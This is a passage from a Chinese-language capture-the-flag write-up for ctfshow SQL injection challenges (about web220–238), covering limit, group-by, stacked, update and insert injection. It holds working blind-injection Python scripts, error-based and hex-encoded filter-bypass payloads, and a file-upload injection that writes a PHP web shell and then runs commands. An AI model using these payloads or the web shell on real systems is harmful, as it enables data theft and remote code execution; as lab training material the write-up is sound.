url = "http://dde5416a-2b12-45b3-92e2-a8eb1b3d91c6.challenge.ctf.show/api/"

strr = "0123456789abcdefghijklmnopqrstuvwxyz{}-_,"

# payload = "select table_name from information_schema.tables where table_schema=database() limit 0,1"

# payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1"

payload = "select flagaabcc from ctfshow_flagxcac"

j = 1
res = ""
while 1:
    print("------------------------")
    print(j)
    for i in strr:
        res += i
        data = {
            'ip': f"1) or if(left(({payload}),{j}) = '{res}',(select count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),1",
            'debug': '1'
        }
        try:
            r = requests.post(url, data=data, timeout=3)
            time.sleep(0.2)
            res = res[:-1]
        except Exception as e:
            print(res)
            j+=1
            break
```

&nbsp;



---

# web221

```sql
limit 注入


查询语句
  //分页查询
  $sql = select * from ctfshow_user limit ($page-1)*$limit,$limit;
      
      
返回逻辑
//TODO:很安全，不需要过滤
//拿到数据库名字就算你赢
```

&nbsp;



**`PROCEDURE ANALYSE()` 函数**

1. **基本概念**

`PROCEDURE ANALYSE()` 是 MySQL 提供的一个**辅助分析工具**，
 作用是：

- 当你查询某张表时，它会对结果集进行分析；
- 返回关于**字段类型优化建议**的报告；
- 主要用于**数据类型优化**，帮助你发现是否用错了类型，或者类型选得太大。

它不是存储过程，而是 MySQL 的一个**内置过程**。

2. **基本语法**

```sql
SELECT * FROM 表名 PROCEDURE ANALYSE();
```

也可以带两个参数：

```sql
SELECT * FROM 表名 PROCEDURE ANALYSE(最大元素数, 最大元素长度);
```

- `最大元素数`（max_elements）：分析时最多检查多少行（默认 256）。
- `最大元素长度`（max_memory）：分析字符串时最多检查多少字节（默认 8192）。

3. **用法示例**

假设有一张表 `users`：

```sql
CREATE TABLE users (
    id INT,
    age INT,
    gender VARCHAR(10),
    email VARCHAR(100)
);

INSERT INTO users VALUES
(1, 18, 'M', 'a@test.com'),
(2, 20, 'F', 'b@test.com'),
(3, 25, 'F', 'c@test.com');
```

执行：

```sql
SELECT * FROM users PROCEDURE ANALYSE();
```

输出结果会像这样（不同版本格式略有差别）：

| Field_name     | Min_value | Max_value | Min_length | Max_length | Optimal_fieldtype   |
| -------------- | --------- | --------- | ---------- | ---------- | ------------------- |
| `users.id`     | 1         | 3         | 1          | 1          | ENUM('1','2','3')   |
| `users.age`    | 18        | 25        | 2          | 2          | TINYINT(2) UNSIGNED |
| `users.gender` | 'F'       | 'M'       | 1          | 1          | ENUM('F','M')       |
| `users.email`  | ...       | ...       | 9          | 9          | VARCHAR(100)        |

解释：

- 它会统计最小值、最大值、长度范围；
- 然后推荐一个**更合适的数据类型**（如 `age` 其实用 `TINYINT` 就够了，而不是 `INT`）。

4. **作用**

- **检查表设计**：帮你发现某些字段类型是否过大。
- **性能优化**：减少存储空间，提高索引效率。
- **规范化设计**：比如发现某字段只出现几个枚举值，建议改成 `ENUM`。



&nbsp;



**`extractvalue()` 函数**

```sql
EXTRACTVALUE(xml_frag, xpath_expr)
```

- **第一个参数**：必须是 **合法的 XML 文本字符串（必须是字符串类型，不能是数字、NULL 等）**
- **第二个参数**：必须是 **合法的 XPath 表达式（必须是字符串，不能为空）**

&nbsp;



**`limit` 后面可以跟两个函数，`procedure`  和 `into` 函数**

**`union` 语句中不允许使用 `PROCEDURE` 子句，因此可以通过报错注入爆出数据库名称**

&nbsp;



**`0x7e` → 这是十六进制形式，代表字符 `~`，标识符。**

**`database()` → MySQL 内置函数，返回当前数据库名。**

**`concat(0x7e, database())` → 拼接成 `"~库名"`。**

&nbsp;



**payload**

```php
?page=1&limit=1 procedure analyse(extractvalue(1,concat(0x7e,database())),1)
?page=1&limit=1 procedure analyse(extractvalue(1,concat(0x1e,database())),1)
?page=1&limit=1 procedure analyse(extractvalue(1,concat(0x2e,database())),1)
```

<img src="\images\article_images\image-20250901001703051.png" alt="image-20250901001703051" style="zoom: 25%;" />

&nbsp;



---

# web222

```sql
group 注入


查询语句
  //分页查询
  $sql = select * from ctfshow_user group by $username;
      
      
返回逻辑
//TODO:很安全，不需要过滤
```

&nbsp;



**可以在 `group by` 后面拼接时间盲注**

<img src="\images\article_images\image-20250901214908847.png" alt="image-20250901214908847" style="zoom:80%;" />

```python
import requests

url = "http://c4c7715a-823e-4d36-84ef-9c80139a11a0.challenge.ctf.show/api/"

#payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"

#payload = "select column_name from information_schema.columns where table_name='ctfshow_flaga' limit 1,1"

payload = "select flagaabc from ctfshow_flaga"
res = ""
i=0
while True:
    i=i+1
    start=32
    end=127
    while start<end:
        mid=(start+end)>>1
        params={
            'u':f"1,if(ascii(substr(({payload}),{i},1))>{mid},sleep(0.1),1)"
        }
        try:
            r=requests.get(url,params=params,timeout=0.5)
            end=mid
        except Exception as e:
            start=mid+1
    if start!=32:
        res=res+chr(start)
    else:
        break
    print(res)
```

&nbsp;



---

# web223

```sql
group 注入


查询语句
  //分页查询
  $sql = select * from ctfshow_user group by $username;
      
      
返回逻辑
//TODO:很安全，不需要过滤
//用户名不能是数字
```

&nbsp;



**经过测试，发现正确回显包含特征字符串 "userAUTO"**

<img src="\images\article_images\image-20250901215937095.png" alt="image-20250901215937095" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250901215955039.png" alt="image-20250901215955039" style="zoom:25%;" />

&nbsp;



**使用上一题的脚本逻辑，利用 `True` 绕过数字过滤即可**

<img src="\images\article_images\image-20250901220404420.png" alt="image-20250901220404420" style="zoom:80%;" />

```python
import requests

# 目标 URL
url = "http://175d306d-7f89-41f8-9b63-8a64a1026d1f.challenge.ctf.show/api/"


# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"

# payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'"

payload = "select flagasabc from ctfshow_flagas"

# 保存爆破出来的结果
flag = ""
# 当前要爆破的字符位置
i = 0

# ==================== 辅助函数 ====================
def gettrue(num):
    """
    绕过过滤数字的情况，用 true 相加代替数字
    """
    res = 'true'
    if num == 1:
        return res
    else:
        for i in range(num - 1):
            res += "+true"
        return res

# ==================== 主爆破逻辑 ====================
while True:
    i = i + 1  # 爆破第 i 个字符

    # ASCII 搜索范围（可打印字符 32~126）
    start = 32
    end = 127

    # 用二分法加速判断
    while start < end:
        mid = (start + end) >> 1  # 取中间值

        # 构造注入参数
        # if(ascii(substr(payload, i, 1)) > mid, username, 'a')
        # 如果大于 mid → 返回 username，页面包含 "userAUTO"
        # 否则 → 返回 'a'，页面不包含 "userAUTO"
        params = {
            'u': f"if(ascii(substr(({payload}),{gettrue(i)},{gettrue(1)}))>{gettrue(mid)},username,'a')"
        }

        # 发送 GET 请求
        r = requests.get(url, params=params)

        # 判断返回结果是否包含特征字符串 "userAUTO"
        if "userAUTO" in r.text:
            start = mid + 1  # ASCII 在更大范围
        else:
            end = mid         # ASCII 在更小范围

    # 如果爆破到的字符不是空格 (32)，说明爆破成功
    if start != 32:
        flag = flag + chr(start)
    else:
        break  # 爆破到空格 → 认为结束

    # 打印当前进度
    print(flag)
```

&nbsp;



---

# web224

**访问 `靶机/robots.txt` ，找到密码重置页面**

<img src="\images\article_images\image-20250901222311968.png" alt="image-20250901222311968" style="zoom:80%;" />

&nbsp;



**重置密码**

<img src="\images\article_images\image-20250901222449332.png" alt="image-20250901222449332" style="zoom:25%;" />

&nbsp;



**重新登录**

<img src="\images\article_images\image-20250901222523739.png" alt="image-20250901222523739" style="zoom:25%;" />

&nbsp;



**目标：往服务器写入一个 WebShell**

&nbsp;



**`C64File`：`Commodore 64` 的文件头**

**`Client UrlCache MMF`：Windows 的缓存文件**

**`*PPD-Adobe`：Adobe 打印机描述文件（PostScript）**

**`"');` ：闭合原本的 SQL 语句字符串**

**`0x3c3f3d60245f4745545b315d603f3e` ：``<?=`$_GET[1]`?>``**

&nbsp;



**三种注入**

```ini
#shell.bin
C64File "');select 0x3c3f3d60245f4745545b315d603f3e into outfile '/var/www/html/1.php';--+
```

```ini
#shell.bin
Client UrlCache MMF"');select 0x3c3f3d60245f4745545b315d603f3e into outfile '/var/www/html/1.php';--+
```

```ini
#shell.bin
*PPD-Adobe: "');select 0x3c3f3d60245f4745545b315d603f3e into outfile '/var/www/html/1.php';--+
```

&nbsp;



**将上面内容保存为 `.bin` 格式文件，选择一个 `.bin` 上传即可**

**进行rce**

```php
/1.php?1=ls /
```

<img src="\images\article_images\image-20250901230751135.png" alt="image-20250901230751135" style="zoom:33%;" />

&nbsp;



```php
/1.php?1=cat flag
```

<img src="\images\article_images\image-20250901230813032.png" alt="image-20250901230813032" style="zoom:33%;" />

&nbsp;



---

# web225

```sql
堆叠注入提升 基础难度


查询语句
  //分页查询
  $sql = "select id,username,pass from ctfshow_user where username = '{$username}';";
      
      
返回逻辑
  //师傅说过滤的越多越好
if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i',$username)){
    die(json_encode($ret));
  }
```

&nbsp;



**==题解一==**

`handler` 是 MySQL 的一个特殊语句，作用是直接操作**表的存储引擎接口**。

- `handler <表名> open;` 表示打开一个表，准备后续操作。

在表打开后，可以用 `read` 读取数据：

- `handler <表名> read next;` 表示读取这张表的下一条记录。
  相当于：

```sql
SELECT * FROM ctfshow_flagasa LIMIT 1;
```



&nbsp;



```php
?username=1';show tables;--+
```

<img src="\images\article_images\image-20250901232203646.png" alt="image-20250901232203646" style="zoom:25%;" />

&nbsp;



```php
?username=1';show columns from ctfshow_flagasa;--+
```

<img src="\images\article_images\image-20250901232241515.png" alt="image-20250901232241515" style="zoom:25%;" />

&nbsp;



```
?username=1';handler ctfshow_flagasa open;handler ctfshow_flagasa read next;--+
```

<img src="\images\article_images\image-20250901232344076.png" alt="image-20250901232344076" style="zoom:25%;" />

&nbsp;



**==题解二==**

**使用sql预处理语句（使用`concat()`拼接sql语句来绕过敏感词）**

**`prepare` 是 MySQL 的动态 SQL 语法，用于创建一个可执行的语句**

**`execute` 执行语句**

&nbsp;



```sql
?username=1'; prepare a from concat('selec',"t group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagasa'");execute a;
```

<img src="\images\article_images\image-20250901234409809.png" alt="image-20250901234409809" style="zoom:25%;" />

&nbsp;



```php
?username=1'; prepare a from concat('selec',"t flagas from ctfshow_flagasa");execute a;
```

<img src="\images\article_images\image-20250901234739228.png" alt="image-20250901234739228" style="zoom:25%;" />

&nbsp;



---

# web226

```sql
堆叠注入提升 中级难度


查询语句
  //分页查询
  $sql = "select id,username,pass from ctfshow_user where username = '{$username}';";
      
      
返回逻辑
  //师傅说过滤的越多越好
if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i',$username)){
    die(json_encode($ret));
  }
```

&nbsp;



**将语句转成十六进制**

```bash
select database();
-->
0x73656c65637420646174616261736528293b


select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'
-->
0x73656C6563742067726F75705F636F6E636174287461626C655F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573207768657265207461626C655F736368656D613D2763746673686F775F77656227


select group_concat(column_name) from information_schema.columns where table_name='ctfsh_ow_flagas'
-->
0x73656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F6E616D653D2763746673685F6F775F666C6167617327


select flagasb from ctfsh_ow_flagas
-->
0x73656C65637420666C61676173622066726F6D2063746673685F6F775F666C61676173
```

&nbsp;





```php
?username=1';prepare a from 0x73656c65637420646174616261736528293b;execute a;
```

<img src="\images\article_images\image-20250901235545621.png" alt="image-20250901235545621" style="zoom:25%;" />

&nbsp;



```php
?username=1';prepare a from 0x73656C6563742067726F75705F636F6E636174287461626C655F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573207768657265207461626C655F736368656D613D2763746673686F775F77656227;execute a;
```

<img src="\images\article_images\image-20250901235813312.png" alt="image-20250901235813312" style="zoom:25%;" />

&nbsp;





```php
?username=1';prepare a from 0x73656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F6E616D653D2763746673685F6F775F666C6167617327;execute a;
```

<img src="\images\article_images\image-20250901235843090.png" alt="image-20250901235843090" style="zoom:25%;" />

&nbsp;



```php
?username=1';prepare a from 0x73656C65637420666C61676173622066726F6D2063746673685F6F775F666C61676173;execute a;
```

<img src="\images\article_images\image-20250901235907842.png" alt="image-20250901235907842" style="zoom:25%;" />

&nbsp;



---

# web227

```sql
堆叠注入提升 高级难度


查询语句
  //分页查询
  $sql = "select id,username,pass from ctfshow_user where username = '{$username}';";
      
      
返回逻辑
  //师傅说过滤的越多越好
if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|db|\,/i',$username)){
    die(json_encode($ret));
  }
```

**表中没有写入flag，而是把flag写在了储存过程和函数中**

**在 MySQL 中，存储过程和函数的信息存储在 `information_schema` 数据库下的 `Routines` 表中**

**查询语法：`select * from information_schema.Routines where ROUTINE_NAME = 'sp_name' `;**

**其中，`ROUTINE_NAME` 字段中存储的是存储过程和函数的名称；`sp_name` 参数表示存储过程或函数的名称。**

&nbsp;



**`CALL` 是用来 调用存储过程（Stored Procedure） 的关键字。**

**存储过程是事先在数据库中定义好的 SQL 逻辑，可以带参数，也可以返回结果。使用 `call` 可以直接执行这个过程**

&nbsp;



```bash
select * from information_schema.routines
-->
0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573
```

&nbsp;



**先查看 `information_schema.routines` 表下储存过程或函数的名称（在这里已经能看到flag，属于非预期）**

```php
?username=1';prepare a from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573;execute a;
```

<img src="\images\article_images\image-20250902001146316.png" alt="image-20250902001146316" style="zoom:25%;" />

&nbsp;



**调用存储过程**

```php
?username=1';call getFlag();
```

<img src="\images\article_images\image-20250902001510264.png" alt="image-20250902001510264" style="zoom:25%;" />

&nbsp;



---

# web228

```sql
堆叠注入提升


查询语句
  //分页查询
  $sql = "select id,username,pass from ctfshow_user where username = '{$username}';";
  $bansql = "select char from banlist;";
    
    
返回逻辑
  //师傅说内容太多，就写入数据库保存
  if(count($banlist)>0){
    foreach ($banlist as $char) {
      if(preg_match("/".$char."/i", $username)){
        die(json_encode($ret));
      }
    }
  }
```

&nbsp;



**将语句转成十六进制**

```bash
select database();
-->
0x73656c65637420646174616261736528293b


select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'
-->
0x73656C6563742067726F75705F636F6E636174287461626C655F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573207768657265207461626C655F736368656D613D2763746673686F775F77656227


select group_concat(column_name) from information_schema.columns where table_name='ctfsh_ow_flagasaa'
-->
0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d2763746673685f6f775f666c61676173616127


select flagasba from ctfsh_ow_flagasaa
-->
0x73656c65637420666c6167617362612066726f6d2063746673685f6f775f666c616761736161
```

&nbsp;



```php
?username=1';prepare a from 0x73656c65637420646174616261736528293b;execute a;
```

<img src="\images\article_images\image-20250902002938050.png" alt="image-20250902002938050" style="zoom:25%;" />

&nbsp;



```php
?username=1';prepare a from 0x73656C6563742067726F75705F636F6E636174287461626C655F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573207768657265207461626C655F736368656D613D2763746673686F775F77656227;execute a;
```

<img src="\images\article_images\image-20250902003018818.png" alt="image-20250902003018818" style="zoom:25%;" />

&nbsp;



```php
?username=1';prepare a from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d2763746673685f6f775f666c61676173616127;execute a;
```

<img src="\images\article_images\image-20250902003120953.png" alt="image-20250902003120953" style="zoom:25%;" />

&nbsp;



```php
?username=1';prepare a from 0x73656c65637420666c6167617362612066726f6d2063746673685f6f775f666c616761736161;execute a;
```

<img src="\images\article_images\image-20250902003323994.png" alt="image-20250902003323994" style="zoom:25%;" />

&nbsp;



---

# web229

```sql
堆叠注入提升


查询语句
  //分页查询
  $sql = "select id,username,pass from ctfshow_user where username = '{$username}';";
    
    
返回逻辑
  //师傅说内容太多，就写入数据库保存
  if(count($banlist)>0){
    foreach ($banlist as $char) {
      if(preg_match("/".$char."/i", $username)){
        die(json_encode($ret));
      }
    }
  }
```

&nbsp;



**将语句转成十六进制**

```bash
select database();
-->
0x73656c65637420646174616261736528293b


select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'
-->
0x73656C6563742067726F75705F636F6E636174287461626C655F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573207768657265207461626C655F736368656D613D2763746673686F775F77656227


select group_concat(column_name) from information_schema.columns where table_name='flag'
-->
0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d27666c616727


select flagasba from flag
-->
0x73656c65637420666c6167617362612066726f6d20666c6167
```

&nbsp;



```php
?username=1';prepare a from 0x73656c65637420646174616261736528293b;execute a;
```

<img src="\images\article_images\image-20250902003601088.png" alt="image-20250902003601088" style="zoom:25%;" />

&nbsp;



```php
?username=1';prepare a from 0x73656C6563742067726F75705F636F6E636174287461626C655F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573207768657265207461626C655F736368656D613D2763746673686F775F77656227;execute a;
```

<img src="\images\article_images\image-20250902003632043.png" alt="image-20250902003632043" style="zoom:25%;" />

&nbsp;





```php
?username=1';prepare a from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d27666c616727;execute a;
```

<img src="\images\article_images\image-20250902003738529.png" alt="image-20250902003738529" style="zoom:25%;" />

&nbsp;



```php
?username=1';prepare a from 0x73656c65637420666c6167617362612066726f6d20666c6167;execute a;
```

<img src="\images\article_images\image-20250902003835041.png" alt="image-20250902003835041" style="zoom:25%;" />

&nbsp;



---

# web230

```sql
堆叠注入提升


查询语句
  //分页查询
  $sql = "select id,username,pass from ctfshow_user where username = '{$username}';";
    
    
返回逻辑
  //师傅说内容太多，就写入数据库保存
  if(count($banlist)>0){
    foreach ($banlist as $char) {
      if(preg_match("/".$char."/i", $username)){
        die(json_encode($ret));
      }
    }
  }
```

&nbsp;



**将语句转成十六进制**

```bash
select database();
-->
0x73656c65637420646174616261736528293b


select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'
-->
0x73656C6563742067726F75705F636F6E636174287461626C655F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573207768657265207461626C655F736368656D613D2763746673686F775F77656227


select group_concat(column_name) from information_schema.columns where table_name='flagaabbx'
-->
0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d27666c6167616162627827


select flagasbas from flagaabbx
-->
0x73656c65637420666c616761736261732066726f6d20666c61676161626278
```

&nbsp;



```php
?username=1';prepare a from 0x73656c65637420646174616261736528293b;execute a;
```

<img src="\images\article_images\image-20250902004051471.png" alt="image-20250902004051471" style="zoom:25%;" />

&nbsp;



```php
?username=1';prepare a from 0x73656C6563742067726F75705F636F6E636174287461626C655F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573207768657265207461626C655F736368656D613D2763746673686F775F77656227;execute a;
```

<img src="\images\article_images\image-20250902004118849.png" alt="image-20250902004118849" style="zoom:25%;" />

&nbsp;





```php
?username=1';prepare a from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d27666c6167616162627827;execute a;
```

<img src="\images\article_images\image-20250902004221065.png" alt="image-20250902004221065" style="zoom:25%;" />

&nbsp;



```php
?username=1';prepare a from 0x73656c65637420666c616761736261732066726f6d20666c61676161626278;execute a;
```

<img src="\images\article_images\image-20250902004319807.png" alt="image-20250902004319807" style="zoom:25%;" />

&nbsp;



---

# web231

```sql
update注入


查询语句
  //分页查询
  $sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
      
      
返回逻辑
  //无过滤
```

&nbsp;



```sql
password=1',username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&username=1
```

<img src="\images\article_images\image-20250902233642007.png" alt="image-20250902233642007" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250902233703141.png" alt="image-20250902233703141" style="zoom:25%;" />

&nbsp;





```sql
password=1',username=(select group_concat(column_name) from information_schema.columns where table_name='flaga')#&username=1
```

<img src="\images\article_images\image-20250902233833741.png" alt="image-20250902233833741" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250902233817972.png" alt="image-20250902233817972" style="zoom:25%;" />

&nbsp;



```sql
password=1',username=(select flagas from ctfshow_web.flaga) where 1=1#&username=1
```

<img src="\images\article_images\image-20250902233946564.png" alt="image-20250902233946564" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250902233929758.png" alt="image-20250902233929758" style="zoom:25%;" />

&nbsp;



---

# web232

```sql
update注入


查询语句
  //分页查询
  $sql = "update ctfshow_user set pass = md5('{$password}') where username = '{$username}';";
      
      
返回逻辑
  //无过滤
```

**使用 `)` 闭合 `MD5` 函数**

&nbsp;



```sql
password=1'),username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&username=1
```

<img src="\images\article_images\image-20250903001248218.png" alt="image-20250903001248218" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903001158964.png" alt="image-20250903001158964" style="zoom:25%;" />

&nbsp;



```sql
password=1'),username=(select group_concat(column_name) from information_schema.columns where table_name='flagaa')#&username=1
```

<img src="\images\article_images\image-20250903001442039.png" alt="image-20250903001442039" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903001419909.png" alt="image-20250903001419909" style="zoom:25%;" />

&nbsp;



```sql
password=1'),username=(select flagass from ctfshow_web.flagaa) where 1=1#&username=1
```

<img src="\images\article_images\image-20250903001532039.png" alt="image-20250903001532039" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903001512925.png" alt="image-20250903001512925" style="zoom:25%;" />

&nbsp;



---

# web233

```sql
update注入


查询语句
  //分页查询
  $sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
      
      
返回逻辑
  //无过滤
```

**使用布尔盲注**

&nbsp;



<img src="\images\article_images\image-20250903003050589.png" alt="image-20250903003050589" style="zoom:80%;" />

```python
import requests

url = "http://5407b3be-41c1-49b3-bde9-c7e2b000b3bf.challenge.ctf.show/api/"

#payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"

#payload = "select group_concat(column_name) from information_schema.columns where table_name='flag233333'"

payload = "select flagass233 from flag233333"
flag = ""
i=0


while True:
    i=i+1
    start=32
    end=127
    while start<end:
        mid=(start+end)>>1
        data={
            'username':f"1' or if(ascii(substr(({payload}),{i},1))>{mid},sleep(0.1),1)#",
            'password':'1'
        }
        try:
            r=requests.post(url,data=data,timeout=2)
            end=mid
        except Exception as e:
            start=mid+1
    if start!=32:
        flag=flag+chr(start)
    else:
        break
    print(flag)
```

&nbsp;



---

# web234

```sql
update注入


查询语句
  //分页查询
  $sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
      
      
返回逻辑
  //无过滤
```

**这一题过滤了单引号 `‘`**

&nbsp;



**使用 `\'` 将会转义成普通字符，因此 `password` 传入 `\` 即可**
**这样，`pass=' where username =`，再传入 `username` 进行注入，末尾多余的 `‘` 注释处理即可**

&nbsp;



```sql
password=\&username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#
```

<img src="\images\article_images\image-20250903123928913.png" alt="image-20250903123928913" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903123845602.png" alt="image-20250903123845602" style="zoom:25%;" />

&nbsp;



**由于过滤了单引号，表名转换成十六进制形式表示**

```sql
password=\&username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)#
```

<img src="\images\article_images\image-20250903124225466.png" alt="image-20250903124225466" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903124201867.png" alt="image-20250903124201867" style="zoom:25%;" />

&nbsp;



```sql
password=\&username=,username=(select flagass23s3 from flag23a)#
```

<img src="\images\article_images\image-20250903124325723.png" alt="image-20250903124325723" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903124310999.png" alt="image-20250903124310999" style="zoom:25%;" />

&nbsp;



---

# web235

```sql
update注入


查询语句
  //分页查询
  $sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
      
      
返回逻辑
  //过滤 or '
```

**过滤了 `or`**

**`information` 字符串包含 `or` ，因此不能使用**

&nbsp;



**`mysql.innodb_table_stats`**

这是 InnoDB 引擎维护的一个系统表，存储 **每个表的统计信息**。
常见字段：

- `database_name` → 数据库名
- `table_name` → 表名
- `last_update` → 最后更新时间
- `n_rows` → 估算的行数
- `clustered_index_size` → 聚簇索引页数
- `sum_of_other_index_sizes` → 其他索引大小

&nbsp;



```sql
password=\&username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#
```

<img src="\images\article_images\image-20250903130026552.png" alt="image-20250903130026552" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903130047142.png" alt="image-20250903130047142" style="zoom:25%;" />



&nbsp;





```sql
password=\&username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#
```

**`select b from ( ... ) a` ：子查询，取别名 `a`**
**在mysql里，要在 `from (子查询)` 里面再取数据，必须给子查询一个别名**

**`select 1,2 as b,3` 构造一条三列结果集：第一列 = 1，第二列 = 2（起别名 b），第三列 = 3**

**`union select * from flag23a1 limit 1,1`：取 `flag23a1` 里的第 2 行**

<img src="\images\article_images\image-20250903131112364.png" alt="image-20250903131112364" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903131053372.png" alt="image-20250903131053372" style="zoom:25%;" />

&nbsp;



---

# web236

```sql
update注入


查询语句
  //分页查询
  $sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
      
      
返回逻辑
  //过滤 or ' flag

```

**这一题过滤的 `flag` ，考察的应该是对查询结果返回的过滤，但是flag的格式为 `ctfshow{}` ，并无影响**



&nbsp;



```sql
password=\&username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#
```

<img src="\images\article_images\image-20250903132600718.png" alt="image-20250903132600718" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903131813142.png" alt="image-20250903131813142" style="zoom:25%;" />

&nbsp;



**base64转码**

```sql
password=\&username=,username=(select to_base64(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a)#

//实际上不使用base64处理也能回显flag
password=\&username=,username=(select b from (select 1,2 as b,3 union select * from flaga limit 1,1)a)#
```

<img src="\images\article_images\image-20250903132838560.png" alt="image-20250903132838560" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903132733347.png" alt="image-20250903132733347" style="zoom:25%;" />



<img src="\images\article_images\image-20250903133014018.png" alt="image-20250903133014018" style="zoom:25%;" />

&nbsp;



---

# web237

```sql
insert注入


查询语句
  //插入数据
  $sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";
      
      
返回逻辑
  //无过滤
```

&nbsp;



```sql
username=1',(select group_concat(table_name) from information_schema.tables where table_schema=database()));#

password=1
```

<img src="\images\article_images\image-20250903134316880.png" alt="image-20250903134316880" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903134340764.png" alt="image-20250903134340764" style="zoom:25%;" />

&nbsp;



```sql
username=1',(select group_concat(column_name) from information_schema.columns where table_name='flag'));#

password=1
```

<img src="\images\article_images\image-20250903134419813.png" alt="image-20250903134419813" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903134441594.png" alt="image-20250903134441594" style="zoom:25%;" />

&nbsp;



```sql
username=1',(select flagass23s3 from flag limit 0,1));#

password=1
```

<img src="\images\article_images\image-20250903134528266.png" alt="image-20250903134528266" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903134543664.png" alt="image-20250903134543664" style="zoom:25%;" />

&nbsp;



---

# web238

```sql
insert注入


查询语句
  //插入数据
  $sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";
      
      
返回逻辑
  //过滤空格
```

**过滤了空格，且经过测试，使用带 `*` 的payload无法实现成功注入**

&nbsp;



```sql
username=1',(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#

password=1
```

<img src="\images\article_images\image-20250903135936598.png" alt="image-20250903135936598" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903140004126.png" alt="image-20250903140004126" style="zoom:25%;" />



&nbsp;



```sql
username=1',(select(group_concat(column_name))from(information_schema.columns)where(table_name='flagb')));#

password=1
```

<img src="\images\article_images\image-20250903140136801.png" alt="image-20250903140136801" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903140158434.png" alt="image-20250903140158434" style="zoom:25%;" />

&nbsp;



```sql
username=1',(select(flag)from(flagb)));#

password=1
```

